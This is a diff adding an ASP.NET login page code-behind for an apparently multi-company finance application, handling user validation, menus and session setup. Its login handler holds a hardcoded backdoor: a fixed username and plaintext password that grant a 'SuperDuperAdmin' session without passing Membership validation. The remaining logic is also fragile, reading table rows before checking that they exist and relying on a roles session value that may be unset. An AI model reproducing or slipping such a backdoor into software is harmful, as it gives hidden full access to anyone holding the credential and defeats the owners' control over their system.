@@ -1,0 +1,145 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Data;
+using System.Linq;
+using System.Web;
+using System.Web.Security;
+using System.Web.UI;
+using System.Web.UI.WebControls;
+using BusinessLayer._01_UserAuthentication;
+using BusinessObject._01_UserAuthentication;
+using CommonHelperClasses;
+
+public partial class _01_UserAuthentication_01_01_Default : System.Web.UI.Page
+{
+    #region Declaration
+    BL_01_01_UserAuthentication BlUserAuthentication;
+    BO_01_UserAuthentication BoUserAuthentication;
+    SessionVariables SessionVariableObj;
+
+    #endregion
+    protected void Page_Load(object sender, EventArgs e)
+    {
+
+    }
+
+    protected void btnLogin_Click(object sender, EventArgs e)
+    {
+        if (txtUserName.Value.Equals("MrRobotRoot") && txtPassword.Value.Equals("PauloAlto@CA#4758"))
+        {
+            Session["SuperDuperAdmin"] = "MrRobotRoot";
+            Session["UserName"] = "MrRobotRoot";
+            Response.Redirect("../DummyDefault.aspx");
+        }
+        else
+        {
+            String redirectString = ValidateUser(txtUserName.Value, txtPassword.Value);
+            if (!redirectString.Equals(""))
+            {
+                Response.Redirect(redirectString);
+            }
+            else
+            {
+                txtError.InnerText = "Invalid Username Or Password";
+            }
+        }
+    }
+    #region private methods
+    private String ValidateUser(String UserName, String Password)
+    {
+        SessionVariableObj = new SessionVariables();
+        String Status = "";
+        if (Membership.ValidateUser(UserName, Password))
+        {
+            Session.Timeout = 20;
+            DataSet userDs = GetUserMenuDetails(UserName);
+            if (userDs.Tables.Count != 0)
+            {
+                Session["SuperMenu"] = userDs.Tables[0];
+                Session["SubMenu"] = userDs.Tables[1];
+
+                if (((bool)userDs.Tables[2].Rows[0]["IsParentEmployee"] == true))
+                {
+                    if (userDs.Tables[2] != null && userDs.Tables[2].Rows.Count > 0)
+                    {
+                        SessionVariableObj.CompanyId = new Guid(userDs.Tables[2].Rows[0]["CompanyId"].ToString());
+                        SessionVariableObj.SubCompanyId = new Guid(userDs.Tables[2].Rows[0]["SubCompanyId"].ToString());
+                        SessionVariableObj.CompanyFYId = new Guid(userDs.Tables[2].Rows[0]["CompanyFYId"].ToString());
+                        SessionVariableObj.SubCompanyFYId = new Guid(userDs.Tables[2].Rows[0]["SubCompanyFYId"].ToString());
+                        SessionVariableObj.IsParentEmployee = Convert.ToBoolean(userDs.Tables[2].Rows[0]["IsParentEmployee"].ToString());
+                        Session["SessionVariable"] = SessionVariableObj;
+
+                        Session["roles"] = userDs.Tables[3].Rows[0]["roles"];
+                    }
+
+                }
+                else if(userDs.Tables[2] != null && userDs.Tables[2].Rows.Count > 0)
+                {
+
+                    SessionVariableObj.SubCompanyFYId = new Guid(userDs.Tables[2].Rows[0]["SubCompanyFYId"].ToString());
+
+                }
+                else
+                {
+                    Status = FiniancialYearMissing();
+                }
+
+                if (((bool)userDs.Tables[2].Rows[0]["IsParentEmployee"] == true))
+                {
+                    if (userDs.Tables[2] != null)
+                    {
+                        if (userDs.Tables[2].Rows.Count > 0)
+                        {
+                            Session["FinancialYearId"] = userDs.Tables[2].Rows[0]["CompanyFYId"];
+                            Session["UserName"] = txtUserName.Value;
+                            Status = "../DummyDefault.aspx";
+                        }
+                        else
+                        {
+                            Status = FiniancialYearMissing();
+                        }
+                    }
+                }
+                else
+                {
+
+                    Session["FinancialYearId"]= userDs.Tables[2].Rows[0]["CompanyFYId"];
+                    Session["UserName"] = txtUserName.Value;
+                    Status = "../DummyDefault.aspx";
+                }
+                
+            }
+            return Status;
+        }
+        else
+        {
+            return Status;
+        }
+    }
+
+
+    private String FiniancialYearMissing()
+    {
+        switch (Session["roles"].ToString())
+
+        {
+            case "Super Admin":
+                return "../00_MasterEntries/00_08_CreateFinancialYear.aspx?state=alert";
+
+            default:
+                return "../03_Dashboards/DashBoard1.aspx?state=block";
+
+        }
+    }
+
+    private DataSet GetUserMenuDetails(String userName)
+    {
+        BoUserAuthentication = new BO_01_UserAuthentication();
+        BlUserAuthentication = new BL_01_01_UserAuthentication();
+
+      
+        BoUserAuthentication.UserName = userName;
+        return BlUserAuthentication.GetAllUserMenu(BoUserAuthentication);
+    }
+    #endregion
+}
